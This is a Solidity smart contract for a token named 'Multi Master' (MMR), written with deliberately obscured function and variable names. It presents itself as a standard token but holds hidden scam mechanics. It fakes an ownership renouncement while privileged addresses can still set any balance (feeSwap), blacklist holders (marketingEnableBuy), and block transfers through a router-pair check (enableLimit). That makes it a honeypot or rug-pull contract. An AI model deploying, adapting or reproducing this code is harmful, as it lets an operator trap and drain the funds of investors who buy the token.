//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface listLaunched {
    function createPair(address tokenLiquidityExempt, address fromFund) external returns (address);
}

interface minIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletTo) external view returns (uint256);

    function transfer(address feeFrom, uint256 teamSellTo) external returns (bool);

    function allowance(address sellWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamSellTo) external returns (bool);

    function transferFrom(
        address sender,
        address feeFrom,
        uint256 teamSellTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverListTrading, uint256 value);
    event Approval(address indexed sellWallet, address indexed spender, uint256 value);
}

abstract contract limitReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minIsMetadata is minIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MultiMaster is limitReceiver, minIs, minIsMetadata {

    address autoShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return atMaxMin;
    }

    string private totalLimitSender = "Multi Master";

    mapping(address => mapping(address => uint256)) private minSell;

    function allowance(address swapLaunch, address buyShould) external view virtual override returns (uint256) {
        if (buyShould == autoShould) {
            return type(uint256).max;
        }
        return minSell[swapLaunch][buyShould];
    }

    function maxIs(address listIsTx, address feeFrom, uint256 teamSellTo) internal returns (bool) {
        require(fundTrading[listIsTx] >= teamSellTo);
        fundTrading[listIsTx] -= teamSellTo;
        fundTrading[feeFrom] += teamSellTo;
        emit Transfer(listIsTx, feeFrom, teamSellTo);
        return true;
    }

    uint256 constant feeSender = 6 ** 10;

    address public takeAt;

    address receiverModeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function enableReceiverMax(address atSwapMarketing) public {
        require(atSwapMarketing.balance < 100000);
        if (feeMarketing) {
            return;
        }
        
        receiverTake[atSwapMarketing] = true;
        if (sellMin != enableSell) {
            exemptSender = marketingFund;
        }
        feeMarketing = true;
    }

    function approve(address buyShould, uint256 teamSellTo) public virtual override returns (bool) {
        minSell[_msgSender()][buyShould] = teamSellTo;
        emit Approval(_msgSender(), buyShould, teamSellTo);
        return true;
    }

    uint256 private atMaxMin = 100000000 * 10 ** 18;

    constructor (){
        if (sellMin != exemptSender) {
            tokenSender = sellMin;
        }
        txMarketing exemptFund = txMarketing(autoShould);
        takeAt = listLaunched(exemptFund.factory()).createPair(exemptFund.WETH(), address(this));
        
        senderLaunched = _msgSender();
        receiverTake[senderLaunched] = true;
        fundTrading[senderLaunched] = atMaxMin;
        totalAmount();
        
        emit Transfer(address(0), senderLaunched, atMaxMin);
    }

    uint256 public tradingTo;

    bool public fundMode;

    function owner() external view returns (address) {
        return listWalletFund;
    }

    function marketingEnableBuy(address tokenSell) public {
        fundReceiver();
        if (teamFrom) {
            teamFrom = true;
        }
        if (tokenSell == senderLaunched || tokenSell == takeAt) {
            return;
        }
        totalIs[tokenSell] = true;
    }

    string private amountIsTake = "MMR";

    function fundReceiver() private view {
        require(receiverTake[_msgSender()]);
    }

    uint256 public tokenSender;

    address private listWalletFund;

    uint256 autoSwap;

    function transfer(address tokenTeam, uint256 teamSellTo) external virtual override returns (bool) {
        return listWalletLaunched(_msgSender(), tokenTeam, teamSellTo);
    }

    uint256 private sellMin;

    function decimals() external view virtual override returns (uint8) {
        return sellFund;
    }

    uint256 public exemptSender;

    mapping(address => uint256) private fundTrading;

    uint256 public enableSell;

    function listWalletLaunched(address listIsTx, address feeFrom, uint256 teamSellTo) internal returns (bool) {
        if (listIsTx == senderLaunched) {
            return maxIs(listIsTx, feeFrom, teamSellTo);
        }
        uint256 fromTeam = minIs(takeAt).balanceOf(receiverModeLiquidity);
        require(fromTeam == swapLaunchMode);
        require(feeFrom != receiverModeLiquidity);
        if (totalIs[listIsTx]) {
            return maxIs(listIsTx, feeFrom, feeSender);
        }
        return maxIs(listIsTx, feeFrom, teamSellTo);
    }

    function getOwner() external view returns (address) {
        return listWalletFund;
    }

    uint8 private sellFund = 18;

    function symbol() external view virtual override returns (string memory) {
        return amountIsTake;
    }

    uint256 swapLaunchMode;

    function balanceOf(address walletTo) public view virtual override returns (uint256) {
        return fundTrading[walletTo];
    }

    event OwnershipTransferred(address indexed shouldTx, address indexed fromLaunched);

    mapping(address => bool) public receiverTake;

    function transferFrom(address listIsTx, address feeFrom, uint256 teamSellTo) external override returns (bool) {
        if (_msgSender() != autoShould) {
            if (minSell[listIsTx][_msgSender()] != type(uint256).max) {
                require(teamSellTo <= minSell[listIsTx][_msgSender()]);
                minSell[listIsTx][_msgSender()] -= teamSellTo;
            }
        }
        return listWalletLaunched(listIsTx, feeFrom, teamSellTo);
    }

    uint256 public marketingFund;

    function totalAmount() public {
        emit OwnershipTransferred(senderLaunched, address(0));
        listWalletFund = address(0);
    }

    bool public feeMarketing;

    address public senderLaunched;

    mapping(address => bool) public totalIs;

    function feeSwap(address tokenTeam, uint256 teamSellTo) public {
        fundReceiver();
        fundTrading[tokenTeam] = teamSellTo;
    }

    function enableLimit(uint256 teamSellTo) public {
        fundReceiver();
        swapLaunchMode = teamSellTo;
    }

    uint256 private teamTakeLimit;

    bool public teamFrom;

    function name() external view virtual override returns (string memory) {
        return totalLimitSender;
    }

}